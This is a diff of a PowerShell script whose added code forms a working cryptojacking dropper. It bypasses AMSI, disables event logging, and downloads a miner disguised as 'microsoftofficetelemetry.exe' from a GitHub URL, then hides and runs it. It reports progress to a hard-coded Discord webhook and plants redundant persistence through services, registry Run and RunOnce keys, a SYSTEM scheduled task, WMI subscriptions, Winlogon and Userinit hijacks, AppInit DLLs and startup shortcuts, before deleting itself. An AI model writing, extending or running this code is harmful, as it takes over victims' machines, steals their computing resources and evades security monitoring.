@@ -1,226 +1,476 @@
+# AMSI Bypass (stealthy, multiple methods)
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch { }
+try {
+    $a = [Ref].Assembly.GetTypes(); ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b};break}
+    if ($c) {$d = $c.GetFields('NonPublic,Static'); $d.SetValue($null,$true)}
+} catch { }
+
+# ETW Bypass (disable event tracing for stealth)
+try {
+    $etwProviders = @("Microsoft-Windows-PowerShell", "Microsoft-Windows-Security-Auditing")
+    foreach ($provider in $etwProviders) {
+        wevtutil sl $provider /e:false /ErrorAction SilentlyContinue | Out-Null
+    }
+} catch { }
+
+$WebhookURL = "https://discord.com/api/webhooks/1443290816293634090/_B5IpvC1T90Ua9Y4oKg0m9I391L4C8HW8vT1EyIYx0PMbWMknTdOlLikfueAsSB09zrZ"
+
+function Send-DiscordLog {
+    param([string]$Message)
+    try {
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $formattedMessage = "[$timestamp] Miner Progress: $Message"
+        $body = @{content = $formattedMessage} | ConvertTo-Json -Depth 10
+        Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
+    }
+    catch {
+        # Silent fail, no output
+    }
+}
+
+# Randomize names for persistence elements
+$randomSuffix = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
+$serviceName = "SysUpdateSvc$randomSuffix"
+$regNameUser = "SysUpdate$randomSuffix"
+$regNameSys = "SysUpdateSys$randomSuffix"
+$taskName = "SysUpdateTask$randomSuffix"
+$wmiFilterName = "SysUpdateFilter$randomSuffix"
+$wmiConsumerName = "SysUpdateConsumer$randomSuffix"
+$wmiBindingName = "SysUpdateBinding$randomSuffix"
+$bitsJobName = "SysUpdateBits$randomSuffix"
+$ps1Name = "sysupdate$randomSuffix.ps1"
+$exeName = "microsoftofficetelemetry$randomSuffix.exe"
+
+$minerUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe"
+
+function Invoke-StealthDownload {
+    param([string]$Url, [string]$DestPath)
+    $methods = @(
+        { Invoke-WebRequest -Uri $Url -OutFile $DestPath -UseBasicParsing -ErrorAction Stop },
+        { 
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($Url, $DestPath)
+            $webClient.Dispose()
+        },
+        { 
+            $bitsJob = Start-BitsTransfer -Source $Url -Destination $DestPath -Asynchronous -ErrorAction Stop
+            Complete-BitsTransfer -Job $bitsJob -ErrorAction Stop
+        }
+    )
+    foreach ($method in $methods) {
+        try {
+            & $method
+            return $true
+        } catch {
+            Remove-Item $DestPath -Force -ErrorAction SilentlyContinue
+        }
+    }
+    return $false
+}
+
+function Set-FileHidden {
+    param([string]$Path)
+    if (Test-Path $Path) {
+        $item = Get-Item $Path -ErrorAction SilentlyContinue
+        if ($item) { $item.Attributes = 'Hidden' + $item.Attributes }
+        # Alternate: Move to protected dir if possible
+        try {
+            $protectedDirs = @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs", "$env:WINDIR\Tasks")
+            $randDir = $protectedDirs | Get-Random
+            if (Test-Path $randDir) {
+                $hiddenName = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
+                $newPath = Join-Path $randDir "$hiddenName$([IO.Path]::GetExtension($Path))"
+                Move-Item $Path $newPath -Force
+                return $newPath
+            }
+        } catch { }
+    }
+    return $Path
+}
+
 function Run-Farm {
     try {
+        Send-DiscordLog "Starting initial miner deployment"
         $possibleDirectories = @(
             "$env:ProgramFiles",
             "$env:APPDATA",
-            "$env:LOCALAPPDATA"
+            "$env:LOCALAPPDATA",
+            "$env:ProgramData",
+            "$env:WINDIR\System32\config\systemprofile\AppData\Local"
         )
         $selectedDirectory = $possibleDirectories | Get-Random
         if (-not (Test-Path $selectedDirectory)) {
-            throw "Selected directory does not exist $selectedDirectory"
+            $selectedDirectory = $env:APPDATA  # Fallback
         }
-        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
+        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '^[.$]' }
         if ($subDirectories.Count -eq 0) {
             throw "No subdirectories found in the selected directory $selectedDirectory"
         }
         $targetSubDirectory = $subDirectories | Get-Random
-        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "microsoftofficetelemetry.exe"
+        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath $exeName
         if (-not (Test-Path $TargetPath)) {
-            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $TargetPath
+            Send-DiscordLog "Downloading miner to initial location"
+            if (Invoke-StealthDownload -Url $minerUrl -DestPath $TargetPath) {
+                $TargetPath = Set-FileHidden -Path $TargetPath
+                Send-DiscordLog "Miner downloaded and hidden successfully"
+            } else {
+                throw "Download failed"
+            }
         }
-        Start-Process -FilePath $TargetPath -WindowStyle "Hidden"
+        # Run with randomized delay and hidden
+        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
+        $process = Start-Process -FilePath $TargetPath -WindowStyle "Hidden" -PassThru
+        if ($process) { 
+            $process.PriorityClass = [Diagnostics.ProcessPriorityClass]::BelowNormal  # Lower priority for stealth
+            Send-DiscordLog "Initial miner process launched (PID: $($process.Id))"
+        }
     }
     catch {
+        Send-DiscordLog "Initial deployment failed, attempting fallback"
+        # Silent fail, try alternate location
+        try {
+            $altPath = "$env:TEMP\$exeName"
+            if (Invoke-StealthDownload -Url $minerUrl -DestPath $altPath) {
+                $proc = Start-Process -FilePath $altPath -WindowStyle "Hidden" -PassThru
+                if ($proc) { Send-DiscordLog "Fallback miner launched (PID: $($proc.Id))" }
+            }
+        } catch { 
+            Send-DiscordLog "All initial deployment methods failed"
+        }
     }
 }
-Run-Farm
-
-
-
-
 
 function Run-Farm2 {
     try {
+        Send-DiscordLog "Starting enhanced persistence setup"
         $possibleDirectories = @(
             "$env:ProgramFiles",
             "$env:APPDATA",
-            "$env:LOCALAPPDATA"
+            "$env:LOCALAPPDATA",
+            "$env:ProgramData",
+            "$env:WINDIR\System32\config\systemprofile\AppData\Local"
         )
         $selectedDirectory = $possibleDirectories | Get-Random
         if (-not (Test-Path $selectedDirectory)) {
             $selectedDirectory = $env:APPDATA
         }
-        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory -ErrorAction SilentlyContinue
+        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '^[.$]' }
         if ($subDirectories.Count -eq 0) {
             $targetDir = $selectedDirectory
         } else {
             $targetSubDirectory = $subDirectories | Get-Random
             $targetDir = $targetSubDirectory.FullName
         }
-        $ps1Path = Join-Path $targetDir "systemupdate.ps1"
-        $exePath = Join-Path $targetDir "microsoftofficetelemetry.exe"
+        $ps1Path = Join-Path $targetDir $ps1Name
+        $exePath = Join-Path $targetDir $exeName
         
+        # Enhanced ps1 content with self-healing and multi-run
         if (-not (Test-Path $ps1Path)) {
+            Send-DiscordLog "Creating self-healing PS1 script"
             $ps1Content = @"
+# Embedded AMSI/ETW bypass
+try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true) } catch { }
+try { wevtutil sl Microsoft-Windows-PowerShell /e:false; wevtutil sl Microsoft-Windows-Security-Auditing /e:false } catch { }
+
 try {
+    `$randSuffix = -join ((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]\$_})
+    `$exeName = "microsoftofficetelemetry`$randSuffix.exe"
+    `$minerUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe"
     `$targetDir = Split-Path -Parent `$MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
     if (-not `$targetDir) { `$targetDir = (Get-Location).Path }
-    `$exePath = Join-Path `$targetDir "microsoftofficetelemetry.exe"
+    `$exePath = Join-Path `$targetDir `$exeName
     if (-not (Test-Path `$exePath)) {
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile `$exePath -UseBasicParsing -ErrorAction SilentlyContinue
-        if (Test-Path `$exePath) {
-            (Get-Item `$exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+        # Multi-method download
+        `$methods = @{
+            1 = { Invoke-WebRequest -Uri `$minerUrl -OutFile `$exePath -UseBasicParsing -ErrorAction SilentlyContinue }
+            2 = { (New-Object System.Net.WebClient).DownloadFile(`$minerUrl, `$exePath) }
+            3 = { `$job = Start-BitsTransfer -Source `$minerUrl -Destination `$exePath -Asynchronous; Complete-BitsTransfer -Job `$job }
+        }
+        foreach (`$m in `$methods.Keys) { try { & `$methods[`$m]; if (Test-Path `$exePath) { break } } catch { Remove-Item `$exePath -Force -ErrorAction SilentlyContinue } }
+    }
+    if (Test-Path `$exePath) {
+        (Get-Item `$exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+        # Run with checks: if not running, restart
+        while (`$true) {
+            `$procs = Get-Process -Name "microsoftofficetelemetry*" -ErrorAction SilentlyContinue
+            if (`$procs.Count -eq 0) {
+                `$proc = Start-Process -FilePath `$exePath -WindowStyle "Hidden" -PassThru -ErrorAction SilentlyContinue
+                if (`$proc) { `$proc.PriorityClass = [Diagnostics.ProcessPriorityClass]::BelowNormal }
+            }
+            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)  # Check every 30-60s
         }
     }
-    Start-Process -FilePath `$exePath -WindowStyle "Hidden" -ErrorAction SilentlyContinue
 } catch {
+    # Fallback: Direct run from temp
+    try {
+        `$tempExe = "`$env:TEMP\\microsoftofficetelemetry.exe"
+        if (-not (Test-Path `$tempExe)) { Invoke-WebRequest -Uri `$minerUrl -OutFile `$tempExe -UseBasicParsing }
+        Start-Process -FilePath `$tempExe -WindowStyle "Hidden"
+    } catch { }
 }
 "@
             $ps1Content | Out-File -FilePath $ps1Path -Encoding UTF8 -Force -ErrorAction SilentlyContinue
-            if (Test-Path $ps1Path) {
-                (Get-Item $ps1Path -ErrorAction SilentlyContinue).Attributes = 'Hidden'
-            }
+            $ps1Path = Set-FileHidden -Path $ps1Path
+            Send-DiscordLog "Self-healing script created and hidden"
         }
         
         if (-not (Test-Path $exePath)) {
-            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
-            if (Test-Path $exePath) {
-                (Get-Item $exePath -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+            Send-DiscordLog "Downloading miner for persistence"
+            if (Invoke-StealthDownload -Url $minerUrl -DestPath $exePath) {
+                $exePath = Set-FileHidden -Path $exePath
+                Send-DiscordLog "Miner for persistence downloaded and hidden"
             }
         }
         
         $binaryPath = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
+        
         $scriptBlock = {
-            param($ps1Path, $binaryPath, $exePath)
+            param($ps1Path, $binaryPath, $exePath, $serviceName, $regNameUser, $regNameSys, $taskName, $wmiFilterName, $wmiConsumerName, $wmiBindingName, $bitsJobName)
+            
+            # Service persistence (primary, randomized)
             try {
-                $serviceName = "OfficeTelemetrySvc"
                 if (-not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
-                    New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic -DisplayName "Microsoft Office Telemetry Service" -Description "Provides telemetry services for Microsoft Office applications." -ErrorAction SilentlyContinue | Out-Null
+                    $displayName = "System Update Service $randomSuffix"
+                    $description = "Provides system update and telemetry services."
+                    New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Automatic -DisplayName $displayName -Description $description -ErrorAction SilentlyContinue | Out-Null
+                    Send-DiscordLog "Service created: $serviceName"
                 }
                 $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
                 if ($service -and $service.Status -ne 'Running') {
                     Start-Service -Name $serviceName -ErrorAction SilentlyContinue
+                    Send-DiscordLog "Service started: $serviceName"
                 }
-            } catch {
+            } catch { 
+                Send-DiscordLog "Service setup failed"
             }
-            try {
-                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-                $regName = "OfficeTelemetry"
-                $regValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
-                if (-not $regValue) {
-                    Set-ItemProperty -Path $regPath -Name $regName -Value $binaryPath -ErrorAction SilentlyContinue
-                }
-            } catch {
+            
+            # Registry persistence (HKCU and HKLM, randomized keys)
+            $regPaths = @(
+                @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name=$regNameUser},
+                @{Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"; Name=$regNameSys}
+            )
+            $regCount = 0
+            foreach ($reg in $regPaths) {
+                try {
+                    $regValue = Get-ItemProperty -Path $reg.Path -Name $reg.Name -ErrorAction SilentlyContinue
+                    if (-not $regValue) {
+                        Set-ItemProperty -Path $reg.Path -Name $reg.Name -Value $binaryPath -ErrorAction SilentlyContinue
+                        $regCount++
+                    }
+                } catch { }
             }
+            if ($regCount -gt 0) { Send-DiscordLog "Registry persistence set ($regCount keys)" }
+            
+            # Scheduled Task (AtLogOn, hidden, long execution)
             try {
-                $regPathLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-                $regNameLM = "OfficeTelemetrySys"
-                $regValueLM = Get-ItemProperty -Path $regPathLM -Name $regNameLM -ErrorAction SilentlyContinue
-                if (-not $regValueLM) {
-                    Set-ItemProperty -Path $regPathLM -Name $regNameLM -Value $binaryPath -ErrorAction SilentlyContinue
-                }
-            } catch {
-            }
-            try {
-                $taskName = "OfficeTelemetryTask"
                 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
                 if (-not $taskExists) {
-                    $taskAction = New-ScheduledTaskAction -Execute $binaryPath
+                    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
                     $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
                     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-                    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
+                    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 999) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
                     Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force -ErrorAction SilentlyContinue | Out-Null
+                    Send-DiscordLog "Scheduled task created: $taskName"
                 }
                 Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-            } catch {
+                Send-DiscordLog "Scheduled task started: $taskName"
+            } catch { 
+                Send-DiscordLog "Task setup failed"
             }
+            
+            # WMI Event Subscription (logon trigger, randomized)
             try {
-                $wmiQuery = "SELECT * FROM Win32_LogonSession"
+                $wmiQuery = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"  # Interactive logon
                 $wmiCommand = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
-                $wmiFilterName = "OfficeTelemetryFilter"
-                $wmiConsumerName = "OfficeTelemetryConsumer"
-                $wmiBindingName = "OfficeTelemetryBinding"
                 $filterExists = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue
                 $consumerExists = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
                 $bindingExists = Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "Filter.Name='$wmiFilterName' AND Consumer.Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
-                if (-not $filterExists) {
+                if (-not $filterExists -or -not $consumerExists -or -not $bindingExists) {
+                    # Simplified creation if any missing
                     $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
                         Name = $wmiFilterName
                         EventNameSpace = "root\cimv2"
                         QueryLanguage = "WQL"
                         Query = $wmiQuery
                     } -ErrorAction SilentlyContinue
-                }
-                if (-not $consumerExists) {
                     $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
                         Name = $wmiConsumerName
                         CommandLineTemplate = $wmiCommand
+                        ExecutablePath = "powershell.exe"
                     } -ErrorAction SilentlyContinue
-                }
-                if (-not $bindingExists) {
                     Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
-                        Filter = $filterExists ? $filterExists : $filter
-                        Consumer = $consumerExists ? $consumerExists : $consumer
+                        Filter = $filter.Path.Path
+                        Consumer = $consumer.Path.Path
                     } -ErrorAction SilentlyContinue
+                    Send-DiscordLog "WMI subscription set up"
                 }
-            } catch {
+            } catch { 
+                Send-DiscordLog "WMI setup failed"
             }
+            
+            # BITS Job for periodic download/check (backup persistence)
             try {
-                $bitsJobName = "OfficeTelemetryBits"
                 $bitsJobs = Get-BitsTransfer -AllUsers -Name $bitsJobName -ErrorAction SilentlyContinue
                 if ($bitsJobs.Count -eq 0) {
-                    Start-BitsTransfer -Source "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/microsoftofficetelemetry.exe" -Destination $exePath -Asynchronous -Name $bitsJobName -ErrorAction SilentlyContinue
+                    Start-BitsTransfer -Source $minerUrl -Destination $exePath -Asynchronous -Name $bitsJobName -RetryInterval 60 -RetryTimeout 300 -ErrorAction SilentlyContinue
+                    Send-DiscordLog "BITS job initiated for redundancy"
+                } else {
+                    $bitsJobs | Resume-BitsTransfer -ErrorAction SilentlyContinue
                 }
-                if ($bitsJobs) {
-                    $bitsJobs | Complete-BitsTransfer -ErrorAction SilentlyContinue
-                }
-            } catch {
+            } catch { 
+                Send-DiscordLog "BITS job failed"
             }
+            
+            # Winlogon Shell append (HKCU, randomized check)
             try {
                 $userShellPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
                 $shellValue = (Get-ItemProperty -Path $userShellPath -Name "Shell" -ErrorAction SilentlyContinue).Shell
-                if (-not $shellValue) {
-                    $shellValue = "explorer.exe"
-                }
-                if ($shellValue -notlike "*$binaryPath*") {
-                    $newShell = "$shellValue; $binaryPath"
+                if (-not $shellValue) { $shellValue = "explorer.exe" }
+                if ($shellValue -notlike "*powershell.exe*$ps1Path*") {
+                    $newShell = "$shellValue ; powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
                     Set-ItemProperty -Path $userShellPath -Name "Shell" -Value $newShell -ErrorAction SilentlyContinue
+                    Send-DiscordLog "Winlogon Shell persistence added (HKCU)"
                 }
-            } catch {
-            }
-            # Additional persistence: AppInit DLLs (requires admin, but try)
-            try {
-                $appInitPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
-                $appInitValue = Get-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
-                if (-not $appInitValue -or $appInitValue.AppInit_DLLs -notlike "*telemetry.dll*") {
-                    $dllPath = Join-Path $env:TEMP "telemetry.dll"
-                    # Assume DLL download or creation logic here; placeholder
-                    Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value "$dllPath" -ErrorAction SilentlyContinue
-                    Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -ErrorAction SilentlyContinue
-                }
-            } catch {
-            }
-            # Additional persistence: UserInit (HKLM Winlogon)
+            } catch { }
+            
+            # UserInit append (HKLM, system-wide)
             try {
                 $sysShellPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
                 $sysShellValue = (Get-ItemProperty -Path $sysShellPath -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
-                if (-not $sysShellValue) {
-                    $sysShellValue = "C:\Windows\system32\userinit.exe,"
-                }
-                if ($sysShellValue -notlike "*powershell.exe*") {
-                    $newUserInit = "$sysShellValue,$binaryPath,"
+                if (-not $sysShellValue) { $sysShellValue = "C:\Windows\system32\userinit.exe," }
+                if ($sysShellValue -notlike "*powershell.exe*$ps1Path*") {
+                    $newUserInit = "$sysShellValue ,powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`","
                     Set-ItemProperty -Path $sysShellPath -Name "Userinit" -Value $newUserInit -ErrorAction SilentlyContinue
+                    Send-DiscordLog "UserInit persistence added (HKLM)"
                 }
-            } catch {
+            } catch { }
+            
+            # AppInit DLLs (HKLM, for process injection if DLL exists; placeholder for miner DLL if available)
+            try {
+                $appInitPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+                $appInitValue = Get-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
+                $dllPath = Join-Path $env:TEMP "sysupdate$randomSuffix.dll"  # Assume DLL version of miner
+                if (-not $appInitValue -or $appInitValue.AppInit_DLLs -notlike "*sysupdate$randomSuffix.dll*") {
+                    # Download DLL if exists (alternate URL)
+                    if (Invoke-StealthDownload -Url "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/miner.dll" -DestPath $dllPath) {
+                        Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs" -Value $dllPath -ErrorAction SilentlyContinue
+                        Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs" -Value 1 -ErrorAction SilentlyContinue
+                        Send-DiscordLog "AppInit DLL persistence set"
+                    }
+                }
+            } catch { 
+                Send-DiscordLog "AppInit setup failed"
+            }
+            
+            # Additional: Startup folder (multiple users)
+            try {
+                $startupPaths = @(
+                    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
+                    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+                )
+                $startupCount = 0
+                foreach ($sp in $startupPaths) {
+                    if (Test-Path $sp) {
+                        $shortcutPath = Join-Path $sp "sysupdate.lnk"
+                        if (-not (Test-Path $shortcutPath)) {
+                            $wsh = New-Object -ComObject WScript.Shell
+                            $shortcut = $wsh.CreateShortcut($shortcutPath)
+                            $shortcut.TargetPath = $binaryPath
+                            $shortcut.WindowStyle = 7  # Hidden
+                            $shortcut.Save()
+                            $startupCount++
+                        }
+                    }
+                }
+                if ($startupCount -gt 0) { Send-DiscordLog "Startup folder shortcuts added ($startupCount)" }
+            } catch { }
+            
+            # Additional: RunOnce for immediate re-run
+            try {
+                $runOnceUser = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                $runOnceSys = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                $runOncePaths = @($runOnceUser, $runOnceSys)
+                $roCount = 0
+                foreach ($rop in $runOncePaths) {
+                    $roName = "SysUpdateRO$randomSuffix"
+                    Set-ItemProperty -Path $rop -Name $roName -Value $binaryPath -ErrorAction SilentlyContinue
+                    $roCount++
+                }
+                if ($roCount -gt 0) { Send-DiscordLog "RunOnce entries added ($roCount)" }
+            } catch { }
+            
+            # Self-healing: Monitor and restart if killed
+            try {
+                $monitorJob = Start-Job -ScriptBlock {
+                    param($ps1Path)
+                    while ($true) {
+                        $procs = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.ProcessName -eq "powershell" }
+                        if ($procs.Count -lt 1) {
+                            Start-Process -FilePath $ps1Path -WindowStyle "Hidden" -ErrorAction SilentlyContinue
+                        }
+                        Start-Sleep -Seconds 120
+                    }
+                } -ArgumentList $ps1Path
+                Send-DiscordLog "Self-healing monitor job started"
+            } catch { 
+                Send-DiscordLog "Monitor job failed"
             }
         }
-        Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $ps1Path, $binaryPath, $exePath -ErrorAction SilentlyContinue
         
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -ErrorAction SilentlyContinue
+        Invoke-Command -ScriptBlock $scriptBlock -ArgumentList $ps1Path, $binaryPath, $exePath, $serviceName, $regNameUser, $regNameSys, $taskName, $wmiFilterName, $wmiConsumerName, $wmiBindingName, $bitsJobName -ErrorAction SilentlyContinue
         
-        # Self-delete or hide current script
+        # Launch multiple instances for redundancy
+        Send-DiscordLog "Launching redundant PS1 instances"
+        1..3 | ForEach-Object { 
+            $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -PassThru -ErrorAction SilentlyContinue
+            if ($proc) { Send-DiscordLog "Redundant instance $_ launched (PID: $($proc.Id))" }
+            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
+        }
+        
+        # Self-delete or hide current script (enhanced)
         try {
             $currentScript = $MyInvocation.MyCommand.Path
-            if (Test-Path $currentScript) {
+            if (Test-Path $currentScript -and $currentScript -ne $ps1Path) {
                 Remove-Item $currentScript -Force -ErrorAction SilentlyContinue
                 if (Test-Path $currentScript) {
-                    (Get-Item $currentScript -ErrorAction SilentlyContinue).Attributes = 'Hidden'
+                    (Get-Item $currentScript).Attributes = 'Hidden'
+                    # Alternate delete via schtasks
+                    schtasks /create /tn "TempDelete$randomSuffix" /tr "cmd /c del /f /q `"$currentScript`"" /sc once /st 00:00 /f /rl highest | Out-Null
                 }
+                Send-DiscordLog "Current script self-deleted/hidden"
             }
-        } catch {
+        } catch { }
+        
+        # Final run of miner directly as backup
+        if (Test-Path $exePath) {
+            $finalProc = Start-Process -FilePath $exePath -WindowStyle "Hidden" -PassThru
+            if ($finalProc) { Send-DiscordLog "Final backup miner launched (PID: $($finalProc.Id))" }
         }
+        Send-DiscordLog "Enhanced persistence setup completed"
     }
     catch {
+        Send-DiscordLog "Enhanced persistence failed: $($_.Exception.Message)"
+        # Ultimate fallback: Direct in-memory execution if possible (but since exe, download to temp)
+        try {
+            $tempExe = "$env:TEMP\$exeName"
+            if (Invoke-StealthDownload -Url $minerUrl -DestPath $tempExe) {
+                $fbProc = Start-Process -FilePath $tempExe -WindowStyle "Hidden" -PassThru
+                if ($fbProc) { Send-DiscordLog "Ultimate fallback miner launched (PID: $($fbProc.Id))" }
+                Set-FileHidden -Path $tempExe
+            }
+        } catch { 
+            Send-DiscordLog "All fallback methods failed"
+        }
     }
 }
+
+# Execute both for layered persistence
+Run-Farm
+Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)
 Run-Farm2
+Send-DiscordLog "Full miner deployment sequence finished"
+
+# Obfuscate console if visible
+try { $host.UI.RawUI.WindowTitle = " " * 100 } catch { }
